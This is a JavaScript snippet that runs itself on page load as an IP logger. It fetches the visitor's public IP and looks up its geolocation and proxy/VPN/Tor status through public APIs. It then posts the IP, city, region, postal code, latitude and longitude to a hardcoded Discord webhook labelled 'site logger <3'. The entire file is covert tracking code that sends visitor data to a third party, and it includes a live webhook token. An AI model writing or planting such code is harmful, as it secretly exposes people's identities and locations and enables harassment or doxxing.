const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(res => res.json())
                .then(data => {

                    const isProxy = data.security?.proxy === true;
                    const isTor   = data.security?.tor === true;
                    const isVpn   = data.security?.vpn === true;

                    let status;

                    if (isProxy || isTor || isVpn) {
                        status = "Likely Proxy / VPN / Tor\n";
                } else {
                        status = "Not a Proxy\n";
                }
            
                return fetch(`https://ipapi.co/${ipadd}/json/`)
                    .then(geoResponse => geoResponse.json())
                    .then(geoData => {
                        const dscURL = 'https://discord.com/api/webhooks/1443094310169088050/6IZeJRM-6yBlD-GOK9t_mfaI89UO7LaPuo80CTNQY9PxgZAFaDYIWZM9GiAGmkVQzftL'; 
                        return fetch(dscURL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                                },
                            body: JSON.stringify({
                                username: "site logger <3", 
                                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", 
                                content: `@here`,
                                embeds: [
                                    {
                                        title: 'Logger!',
                                        description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}\n**Proxy Status >> ** ${status}`,
                                        color: 0x800080 
                                    }
                                ]
                            })
                        });
                    })
                }
            )
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();
